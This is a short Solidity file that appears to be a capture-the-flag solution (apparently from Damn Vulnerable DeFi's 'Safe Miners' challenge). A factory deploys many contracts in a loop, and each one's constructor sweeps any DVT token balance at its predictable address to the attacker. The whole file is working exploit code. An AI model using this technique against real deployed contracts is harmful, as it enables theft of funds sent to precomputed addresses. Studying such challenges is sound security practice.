// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title Attacker Deployer
 * @author kyrers
 * @notice This contract just acts as a factory that deploys 500 attackers each time
 */
contract SafeMinersAttackerFactory {
    constructor(IERC20 _token, uint256 _attempts) {
        for (uint256 attempt; attempt < _attempts; attempt++) {
            new SafeMinersAttacker(msg.sender, _token);
        }
    }
}

/**
 * @title Attacker
 * @author kyrers
 * @notice This contract just transfers its DVT balance to the attacker account. I figured it wasn't worth checking the balance before transferring 
 */
contract SafeMinersAttacker {
    constructor(address _attacker, IERC20 _token) {
        uint256 balance = _token.balanceOf(address(this));
        _token.transfer(_attacker, balance);
    }
}